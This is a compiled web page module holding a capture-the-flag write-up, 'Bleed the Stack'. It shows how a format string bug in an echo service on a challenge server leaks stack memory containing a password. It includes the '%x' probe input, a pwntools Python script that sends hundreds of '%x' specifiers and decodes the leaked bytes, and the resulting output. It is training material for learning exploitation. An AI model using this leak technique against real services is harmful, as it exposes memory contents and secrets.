import{s as an,n as q}from"./scheduler.rijuCTql.js";import{S as tn,i as en,g as e,s as o,H as _,h as p,I as g,c as l,j as x,z as v,f as s,k as b,a as t}from"./index.7JfBVtF2.js";function pn(W){let c,z="bleed the stack",E,i,N='(<a href="https://0x0539.net/play/fangorn/bleedthestack" rel="nofollow">challenge page</a>)',C,u,T,X=`<code class="language-undefined">pls@RUBY ~ &gt; nc challenges.0x0539.net 7070
ADVANCED CHALLENGE :: BLEED THE STACK
*****************************

Test me! Enter your name and I&#39;ll print it back to you!</code>`,H,r,F='i started off by sending <code>%x</code> as a test, which immediately leaked hex values, so the program is likely vulnerable to a <a href="https://owasp.org/www-community/attacks/Format_string_attack" rel="nofollow">format string attack</a>:',L,k,P,Z=`<code class="language-undefined">Test me! Enter your name and I&#39;ll print it back to you!
%x %x %x %x %x %x %x %x
40 f7f77620 1 0 1 20656854 73736170 64726f77</code>`,j,d,G=`converting those hexadecimal values to ascii, we get the string <code>@÷÷v [f7f77620] ehTssapdrow</code> (<code>[f7f77620]</code> is invalid ascii). notably, <code>ehTssapdrow</code> is little-endian ordering of the ascii string <code>The password</code>.
we can build a python program with pwntools to send a tonne of ‘%x’ strings, pad out bytearrays with fewer than 4 bytes, and finally flip each dword. noting that some bytearrays dont appear to have a valid ascii representation, such as <code>f7f77620</code>, we can handle any errors by just setting the .`,R,f,A,$=`<code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'CRITICAL'</span>
host<span class="token punctuation">,</span>port <span class="token operator">=</span> <span class="token string">'challenges.0x0539.net'</span><span class="token punctuation">,</span> <span class="token number">7070</span>
format_str <span class="token operator">=</span> <span class="token string">'%x '</span> <span class="token operator">*</span> <span class="token number">299</span>

<span class="token keyword">def</span> <span class="token function">decode_bytes</span><span class="token punctuation">(</span>dword<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        decoded <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>dword<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token comment"># convert LE to BE</span>
        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>ch <span class="token keyword">for</span> ch <span class="token keyword">in</span> decoded <span class="token keyword">if</span> <span class="token number">32</span> <span class="token operator">&lt;=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">126</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> UnicodeDecodeError<span class="token punctuation">:</span> <span class="token comment"># dont bother converting if invalid ascii</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'UnicodeDecodeError on bytearray \\'</span></span><span class="token punctuation">&#123;</span>dword<span class="token punctuation">&#125;</span>\\<span class="token string">'.&#92;n'</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f' </span><span class="token interpolation"><span class="token punctuation">&#123;</span>dword<span class="token punctuation">&#125;</span></span><span class="token string"> '</span></span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    s <span class="token operator">=</span> remote<span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'you!&#92;n'</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>format_str<span class="token punctuation">)</span>

    raw_bytes <span class="token operator">=</span> s<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'&#92;nbytearray:&#92;n</span><span class="token interpolation"><span class="token punctuation">&#123;</span>raw_bytes<span class="token punctuation">&#125;</span></span><span class="token string">&#92;n'</span></span><span class="token punctuation">)</span>
    dwords <span class="token operator">=</span> raw_bytes<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>
    dwords <span class="token operator">=</span> <span class="token punctuation">[</span>dword<span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> dword <span class="token keyword">in</span> dwords<span class="token punctuation">]</span> <span class="token comment"># pad out values lower than 4 bytes</span>
    decoded_dwords <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>decode_bytes<span class="token punctuation">(</span>dword<span class="token punctuation">)</span> <span class="token keyword">for</span> dword <span class="token keyword">in</span> dwords<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'leaked:&#92;n</span><span class="token interpolation"><span class="token punctuation">&#123;</span>decoded_dwords<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span> <span class="token comment"># print result.</span>
    <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token string">'quitting'</span><span class="token punctuation">)</span>

main<span class="token punctuation">(</span><span class="token punctuation">)</span></code>`,M,w,K="so our output from this program gives the following LE bytearray:",B,m,D,nn='<code class="language-bytearray">40 f7f20620 1 0 1 20656854 73736170 64726f77 3a736920 6c5f4920 5f337630 6d723066 625f7434 733675 25207825 78252078 20782520 25207825 78252078 20782520 25207825</code>',I,h,V="which the python script will convert to ascii:",S,y,U,sn='<code class="language-bash">@ f7f20620 The password is: <span class="token punctuation">[</span><span class="token punctuation">[</span>redacted<span class="token punctuation">]</span><span class="token punctuation">]</span> %x %x %x %x %x %x %x %x %x %</code>';return{c(){c=e("h1"),c.textContent=z,E=o(),i=e("p"),i.innerHTML=N,C=o(),u=e("pre"),T=new _(!1),H=o(),r=e("p"),r.innerHTML=F,L=o(),k=e("pre"),P=new _(!1),j=o(),d=e("p"),d.innerHTML=G,R=o(),f=e("pre"),A=new _(!1),M=o(),w=e("p"),w.textContent=K,B=o(),m=e("pre"),D=new _(!1),I=o(),h=e("p"),h.textContent=V,S=o(),y=e("pre"),U=new _(!1),this.h()},l(n){c=p(n,"H1",{"data-svelte-h":!0}),g(c)!=="svelte-jvy5xj"&&(c.textContent=z),E=l(n),i=p(n,"P",{"data-svelte-h":!0}),g(i)!=="svelte-1i2t9w2"&&(i.innerHTML=N),C=l(n),u=p(n,"PRE",{class:!0});var a=x(u);T=v(a,!1),a.forEach(s),H=l(n),r=p(n,"P",{"data-svelte-h":!0}),g(r)!=="svelte-1mj6rix"&&(r.innerHTML=F),L=l(n),k=p(n,"PRE",{class:!0});var Y=x(k);P=v(Y,!1),Y.forEach(s),j=l(n),d=p(n,"P",{"data-svelte-h":!0}),g(d)!=="svelte-h0f1rr"&&(d.innerHTML=G),R=l(n),f=p(n,"PRE",{class:!0});var J=x(f);A=v(J,!1),J.forEach(s),M=l(n),w=p(n,"P",{"data-svelte-h":!0}),g(w)!=="svelte-3901yl"&&(w.textContent=K),B=l(n),m=p(n,"PRE",{class:!0});var O=x(m);D=v(O,!1),O.forEach(s),I=l(n),h=p(n,"P",{"data-svelte-h":!0}),g(h)!=="svelte-1skm4tm"&&(h.textContent=V),S=l(n),y=p(n,"PRE",{class:!0});var Q=x(y);U=v(Q,!1),Q.forEach(s),this.h()},h(){T.a=null,b(u,"class","language-undefined"),P.a=null,b(k,"class","language-undefined"),A.a=null,b(f,"class","language-python"),D.a=null,b(m,"class","language-bytearray"),U.a=null,b(y,"class","language-bash")},m(n,a){t(n,c,a),t(n,E,a),t(n,i,a),t(n,C,a),t(n,u,a),T.m(X,u),t(n,H,a),t(n,r,a),t(n,L,a),t(n,k,a),P.m(Z,k),t(n,j,a),t(n,d,a),t(n,R,a),t(n,f,a),A.m($,f),t(n,M,a),t(n,w,a),t(n,B,a),t(n,m,a),D.m(nn,m),t(n,I,a),t(n,h,a),t(n,S,a),t(n,y,a),U.m(sn,y)},p:q,i:q,o:q,d(n){n&&(s(c),s(E),s(i),s(C),s(u),s(H),s(r),s(L),s(k),s(j),s(d),s(R),s(f),s(M),s(w),s(B),s(m),s(I),s(h),s(S),s(y))}}}const cn={title:"Bleed the Stack",description:"An amateur programmer decides that for his hello world program, he will echo whatever you say. Can you find his mistake?",author:"0x0539",date:"2023-05-16",published:!0};class un extends tn{constructor(c){super(),en(this,c,null,pn,an,{})}}export{un as default,cn as metadata};
